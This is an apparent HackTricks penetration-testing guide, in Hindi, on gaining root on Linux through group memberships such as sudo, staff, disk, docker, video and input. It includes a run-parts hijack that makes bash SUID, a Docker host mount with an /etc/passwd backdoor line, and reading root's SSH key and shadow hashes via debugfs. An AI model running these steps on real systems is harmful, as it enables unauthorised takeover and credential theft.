# दिलचस्प Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**कभी-कभी**, किसी system की **/etc/sudoers** policy (या उसमें शामिल की गई किसी file) में इस तरह की entries होती हैं:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

इसका मतलब है कि किसी भी entry से match होने वाला user, बाकी policy की शर्तों के अधीन, `sudo` के ज़रिए किसी भी target user के रूप में कोई भी command चला सकता है।<sup>[[3]](#references)</sup>

अगर ऐसा है, तो **root बनने के लिए आप बस यह execute कर सकते हैं**:

```
sudo su
```

यदि `sudo -l` में केवल username के साथ सीमित `adduser` invocation की अनुमति हो, तो जाँचें कि क्या यह ऐसा same-named primary group बनाता है जो अभी मौजूद नहीं है। उस group में नया account privileges प्राप्त कर सकता है, यदि effective sudoers policy पहले से `%group` को privileges देती हो; इसे escalation path मानने से पहले group-creation behavior और group rule, दोनों की पुष्टि करें। Account बनाने से system में बदलाव होता है, इसलिए पहले policy की जाँच करें।

### PE - Method 2

सभी suid binaries खोजें और जाँचें कि क्या **Pkexec** binary मौजूद है:

```bash
find / -perm -4000 2>/dev/null
```

यदि **pkexec एक SUID binary है**, तो यह किसी प्रोग्राम को दूसरे user के रूप में केवल तभी चला सकता है जब polkit अनुरोधित कार्रवाई को authorize करे; केवल SUID bit से root access की गारंटी नहीं मिलती। **sudo** या **admin** group की membership को पर्याप्त मानने के बजाय, installed policy और target session के authorization की जांच करें।<sup>[[4]](#references)[[5]](#references)</sup>

अलग [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) path के लिए, पहले पुष्टि करें कि `pkexec` एक executable **root-owned SUID** file है। ऐसी installed binary जिसमें यह bit नहीं है, advisory में बताए गए local SUID escalation का मामला नहीं है। Upstream version string सिर्फ एक सुराग है: distributions [पुराने package versions में fix backport कर सकती हैं](https://ubuntu.com/security/CVE-2021-4034), इसलिए इसे vulnerable कहने से पहले installed vendor package और mitigations की जांच करें।

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) polkit का एक अलग path है: D-Bus authorization race, न कि `pkexec` SUID flaw। Installed vendor polkit package की जांच करें और देखें कि क्या कोई reachable privileged D-Bus action उपयोगी बदलाव कर सकती है; account-creation route के लिए AccountsService जैसी उपयुक्त service भी चाहिए, और नए group की sudo access प्रभावी sudo policy पर निर्भर करती है। Reported polkit version या installed service अपने आप में केवल एक candidate है, खासकर तब जब vendors [fixes backport करते हैं](https://access.redhat.com/security/cve/cve-2021-3560)। Passive enumeration से race trigger नहीं होनी चाहिए।

जो distributions अब भी पुराने Local Authority backend का उपयोग करती हैं, उनमें इसके group rules की जांच करें:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

प्रासंगिक group names और defaults distribution के अनुसार अलग-अलग होते हैं; यहाँ कोई group तभी उपयोगी है जब local policy में उसका नाम हो।<sup>[[5]](#references)</sup>

**root बनने के लिए आप यह execute कर सकते हैं**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

यदि आप **pkexec** चलाने की कोशिश करते हैं और आपको यह **error** मिलता है:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

किसी पंजीकृत authentication agent के बिना SSH session में, `pkexec` इस त्रुटि के साथ विफल हो सकता है, भले ही policy अन्यथा उस कार्रवाई की अनुमति देती हो; polkit गैर-desktop sessions के लिए `pkttyagent` को text authentication agent के रूप में दस्तावेज़ित करता है। इसका सटीक व्यवहार version और distribution पर निर्भर करता है, इसलिए स्थानीय policy और agent setup की जाँच करें। प्रभावित NixOS versions के लिए बताए गए एक workaround में **2 अलग-अलग SSH sessions** का उपयोग होता है।<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

किसी एक account को `su` तक पहुँचने से रोकने वाला ACL उस executable पर लागू होता है, administrator-authorized action तक पहुँचने के हर रास्ते पर नहीं। यदि administrator credential स्वतंत्र रूप से उजागर हुआ है, तो जाँचें कि क्या अलग कार्रवाई—जैसे `systemd-run` के माध्यम से transient system service शुरू करना—प्रभावी polkit policy के तहत अनुमत है, authentication agent किस identity को स्वीकार करता है, और परिणामी service किस identity का उपयोग करेगी। [Polkit, session owner के रूप में authentication और administrator के रूप में authentication में अंतर करता है](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), जबकि [systemd-run, system manager से transient service का अनुरोध कर सकता है](https://systemd.io/CONTROL_GROUP_INTERFACE/). केवल history entry, installed command या पढ़ी जा सकने वाली policy file से authorization या credential की वैधता सिद्ध नहीं होती; passive review में credentials जमा नहीं करने चाहिए और न ही कोई unit शुरू करनी चाहिए।

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Wheel Group

कभी-कभी sudoers policy में यह entry भी हो सकती है:

```
%wheel	ALL=(ALL:ALL) ALL
```

इसका अर्थ है कि इस entry से match होने वाला कोई भी user, `sudo` के माध्यम से किसी भी target user के रूप में कोई भी command चला सकता है (बाकी policy के अधीन)।<sup>[[3]](#references)</sup>

यदि ऐसा है, तो **root बनने के लिए आप बस यह execute कर सकते हैं**:

```
sudo su
```

## Shadow Group

जिन सिस्टमों पर permissions इसकी अनुमति देती हैं, वहाँ **shadow** group के users **/etc/shadow** को **पढ़** सकते हैं; target पर वास्तविक mode और ACLs सत्यापित करें:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

तो, फ़ाइल पढ़ें और कुछ hashes **crack** करने की कोशिश करें।

Hashes की जाँच करते समय lock state की एक अहम बात:
- `!` या `*` वाली entries आम तौर पर password login के लिए non-interactive होती हैं।
- `!hash` का मतलब है कि password locked था; बाकी बचे characters उस password field को दर्शाते हैं जो lock होने से पहले मौजूद थी।
- `*` वाली field मान्य `crypt(3)` hash नहीं होती और UNIX-password login को रोकती है; इससे यह निष्कर्ष न निकालें कि पहले password सेट था या नहीं।
यह सीधे login अवरुद्ध होने पर भी account classification के लिए उपयोगी है।<sup>[[6]](#references)</sup>

## Staff ग्रुप

**staff**: इससे users root privileges के बिना सिस्टम (`/usr/local`) में स्थानीय बदलाव जोड़ सकते हैं (ध्यान दें कि `/usr/local/bin` में मौजूद executables किसी भी user के PATH variable में होते हैं और उसी नाम वाले `/bin` तथा `/usr/bin` के executables को "override" कर सकते हैं)। इसकी तुलना "adm" ग्रुप से करें, जो monitoring/security से अधिक संबंधित है।<sup>[[2]](#references)[[7]](#references)</sup>

Debian configurations में, जहाँ `/usr/local/bin`, `PATH` में `/usr/bin` से पहले आता है (जैसा कि नीचे दिए गए उदाहरणों में है), वहाँ बिना path वाला command पहले `/usr/local/bin` की copy चलाता है; target पर प्रभावी `PATH` की पुष्टि करें।

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

यदि कोई privileged process किसी unqualified command को writable `/usr/local/bin` के ज़रिए resolve करता है, तो उस command को बदलने से वह process के privileges के साथ execute हो सकता है; परीक्षण से पहले वास्तविक path और trigger की पुष्टि करें।

Ubuntu systems पर, login के समय `pam_motd` root के रूप में `run-parts --lsbsysinit` के ज़रिए executable scripts चलाता है; cron jobs भी `run-parts` का उपयोग कर सकते हैं, लेकिन यह distribution और configuration पर निर्भर करता है।<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

नए SSH login पर, `pspy` यह पुष्टि करने में मदद कर सकता है कि target पर इस path को वास्तव में invoke किया जाता है या नहीं; यह root के बिना process command lines देख सकता है।<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## डिस्क ग्रुप

**disk** ग्रुप की सदस्यता से ब्लॉक डिवाइसों तक raw access मिल सकता है और यह अक्सर **root access के लगभग बराबर** होता है; Debian इसे अधिकतर root के बराबर बताता है, लेकिन लक्ष्य सिस्टम पर डिवाइस की वास्तविक permissions और storage layout की पुष्टि करें।<sup>[[7]](#references)</sup>

आम डिवाइस paths में `/dev/sd*` शामिल हैं, लेकिन NVMe और अन्य storage layouts में अलग-अलग नाम इस्तेमाल होते हैं।

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs`, ext2/ext3/ext4 फ़ाइल सिस्टम पर काम करता है; ऊपर दिए गए `/root` और `/etc/shadow` जैसे पथ खोले गए फ़ाइल सिस्टम के अंदर की फ़ाइलें हैं, जबकि `dump` का दूसरा तर्क native filesystem पर आउटपुट पथ है।<sup>[[8]](#references)</sup> उदाहरण के लिए, यह खोले गए फ़ाइल सिस्टम से `/tmp/asd1.txt` निकालकर native filesystem पर `/tmp/asd2.txt` में रखता है:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

`-w` विकल्प filesystem को read-write मोड में खोलता है, और `write` कमांड एक native फ़ाइल को खुले हुए filesystem में कॉपी करता है। इसे mounted live filesystem पर इस्तेमाल करने से बचें, क्योंकि सीधे बदलाव करने से filesystem corrupt हो सकता है; संभव हो तो offline image पर काम करें।<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## वीडियो समूह

`w` कमांड का उपयोग करके आप पता लगा सकते हैं कि **सिस्टम में कौन लॉग इन है**। इसका आउटपुट कुछ इस तरह दिखेगा।<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** प्रविष्टि पहले Linux वर्चुअल कंसोल की पहचान करती है; यह अपने आप में यह साबित नहीं करती कि कोई उपयोगकर्ता मशीन पर भौतिक रूप से मौजूद है, खासकर containers या अन्य वातावरणों में।<sup>[[21]](#references)</sup>

जिन सिस्टमों में पढ़ने योग्य framebuffer device उपलब्ध है, वहाँ **video** group की सदस्यता उस device तक पहुँच दे सकती है। Linux framebuffer interface `/dev/fb0` को पढ़ने योग्य memory device के रूप में दस्तावेज़ित करता है, जिसे screen snapshot के लिए कॉपी किया जा सकता है; `/sys/class/graphics/fb0/virtual_size` path केवल वहीं उपलब्ध होता है जहाँ वह fbdev sysfs attribute मौजूद हो, इसलिए पहले target की जाँच करें।<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

यदि इंस्टॉल किया गया **GIMP** संस्करण raw-data importer उपलब्ध कराता है, तो **`screen.raw`** को उस importer से खोलें; समर्थन और controls संस्करण तथा plug-in के अनुसार अलग-अलग हो सकते हैं।<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Raw image खोलने के लिए आप GIMP का उपयोग कर सकते हैं, screen.raw फ़ाइल चुनें और फ़ाइल प्रकार के रूप में Raw image data चुनें](<../../../images/image (463).png>)

Image Width और Height को framebuffer geometry से मिलाएँ; जब तक output पढ़ने योग्य न हो जाए, उपलब्ध pixel formats/Image Types आज़माएँ।<sup>[[9]](#references)</sup>

![Disk Group - Video Group: फिर Width और Height को स्क्रीन पर उपयोग किए गए मानों के अनुसार बदलें और अलग-अलग Image Types जाँचें (और वह चुनें जिसमें स्क्रीन सबसे बेहतर दिखाई दे)](<../../../images/image (317).png>)

## Input Group

जिन systems में `input` group को keyboard event devices पर read access मिलता है, उनमें group का सदस्य उस device से raw keystrokes देख सकता है। पहले वास्तविक mode और ACL जाँचें: सक्रिय local seat के लिए `uaccess` ACL के ज़रिए access मिल सकता है, और केवल group का नाम access की गारंटी नहीं देता।<sup>[[23]](#references)[[24]](#references)</sup>

Keyboard का `eventX` handler ढूँढें, पुष्टि करें कि मौजूदा account उसका node पढ़ सकता है, फिर `evtest` से एक छोटा अधिकृत test monitor करें। **`--grab`** का उपयोग **न करें**: यह exclusive access लेता है और अन्य applications को input मिलने से रोक सकता है।<sup>[[25]](#references)[[26]](#references)</sup>

```bash
id -nG
cat /proc/bus/input/devices            # Match the keyboard name with its eventX handler
ls -l /dev/input/by-id/*event-kbd      # If persistent keyboard links exist
getfacl /dev/input/eventX             # Check effective group/seat ACL access
evtest /dev/input/eventX              # Stop with Ctrl-C after the test
```

`EV_KEY` तैयार टेक्स्ट के बजाय key codes रिपोर्ट करता है: value `1` का मतलब press, `0` का मतलब release, और `2` का मतलब repeat है। इससे उसी physical keyboard का उपयोग करके किसी अन्य session में टाइप की गई keys का पता चल सकता है, जिसमें credentials भी शामिल हैं, लेकिन इससे अपने-आप root access नहीं मिलता। Desktop compositor, raw device node तक पहुँच को रद्द नहीं करता।<sup>[[25]](#references)</sup>

व्यापक identity और session जाँचों के लिए, [users and sessions](../user-and-session-triage.md) देखें।

## Root Group

**root** group की सदस्यता से root का UID नहीं मिलता, लेकिन `root` के स्वामित्व वाली group-writable files तब भी दिलचस्प हो सकती हैं, जब privileged services या libraries उनका उपयोग करती हों। इसे privilege-escalation path मानने से पहले file की वास्तविक permissions और उसके उपयोग की पुष्टि करें।

**जाँचें कि root group के सदस्य किन files को संशोधित कर सकते हैं**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker समूह

मानक rootful इंस्टॉल में `docker` समूह की सदस्यता Docker daemon तक root-level पहुँच देती है। चूँकि bind mounts डिफ़ॉल्ट रूप से read-write होते हैं, इसलिए उस daemon को नियंत्रित कर सकने वाला उपयोगकर्ता host के `/` को container में mount करके host की फ़ाइलों में बदलाव कर सकता है; इससे host पर प्रभावी रूप से root access मिल जाता है।<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

`/etc/group`, `/etc/gshadow` और मौजूदा process token में समूह की सदस्यता अलग-अलग हो सकती है। अगर उपयोगकर्ता `id -nG` में नहीं दिखता, लेकिन `newgrp docker` सफल होता है, तो नए shell में `id` से दिखाया गया समूह जाँचें और परखें कि Docker socket वास्तव में writable है और rootful daemon चला रहा है। केवल समूह का नाम host पर नियंत्रण की पुष्टि नहीं करता। किसी भी स्वचालित `newgrp` probe की समय-सीमा तय करें, ताकि password prompt से enumeration न अटके।

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

अंत में, अगर आपको ऊपर दिए गए सुझाव पसंद नहीं आए, या वे किसी वजह से काम नहीं कर रहे हैं (docker api firewall?), तो आप हमेशा **एक privileged container चलाकर उससे escape करने** की कोशिश कर सकते हैं, जैसा कि यहाँ बताया गया है:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

अगर आपके पास docker socket पर write permissions हैं, तो [**docker socket का दुरुपयोग करके privileges escalate करने के बारे में यह पोस्ट पढ़ें**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**।**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Adm Group

आमतौर पर **`adm`** group के **members** के पास _/var/log/_ के अंदर मौजूद **log** files को **read** करने की permissions होती हैं।\
इसलिए, अगर आपने इस group के किसी user को compromise किया है, तो आपको निश्चित रूप से **logs पर नज़र डालनी चाहिए**।<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

इन groups के अर्थ service और distribution के अनुसार अलग-अलग होते हैं। Debian, delegated backup/restore के लिए `backup`, printer daemons के लिए `lp`, और `/var/mail` के लिए `mail` को दस्तावेज़ित करता है, इसलिए membership को privilege path मानने से पहले स्थानीय permissions जाँचें।<sup>[[7]](#references)</sup>

अक्सर ये सीधे root तक पहुँचने के बजाय **credential-discovery** के vectors होते हैं:
- **backup**: इसमें configs, keys, DB dumps या tokens वाले archives मिल सकते हैं।
- **operator**: platform-विशिष्ट operational access से संवेदनशील runtime data leak हो सकता है।
- **lp**: print queues/spools में documents की सामग्री हो सकती है।
- **mail**: mail spools में reset links, OTPs और internal credentials मिल सकते हैं।

यहाँ membership को high-value data exposure finding मानें और password/token reuse के ज़रिए आगे बढ़ें।

## Auth group

OpenBSD पर, S/Key कॉन्फ़िगर होने पर `/etc/skey` का owner `root:auth` होता है और इसके records तक पहुँचने के लिए `auth` group की आवश्यकता होती है; YubiKey records `/var/db/yubikey` में रखे जाते हैं।<sup>[[16]](#references)[[17]](#references)</sup> S/Key या YubiKey enabled वाली एक vulnerable OpenBSD 6.6 configuration में `auth` privileges वाले local users root बन सकते थे; Qualys इसके prerequisites और exploit chain का दस्तावेज़ देता है, और लिंक किया गया PoC इसे लागू करता है।<sup>[[18]](#references)[[19]](#references)</sup>



## References

- [1] [GUI session के बिना pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Debian को सुरक्षित करने का मैनुअल](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [The Frame Buffer Device — The Linux Kernel documentation](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Docker को non-root user के रूप में manage करना](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [OpenBSD में authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
- [23] [beep device permissions guidance — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
- [24] [sd-login — systemd manual](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
- [25] [Input event codes — Linux kernel documentation](https://docs.kernel.org/5.18/input/event-codes.html)
- [26] [evtest(1) — Debian Manpages](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
{{#include ../../../banners/hacktricks-training.md}}
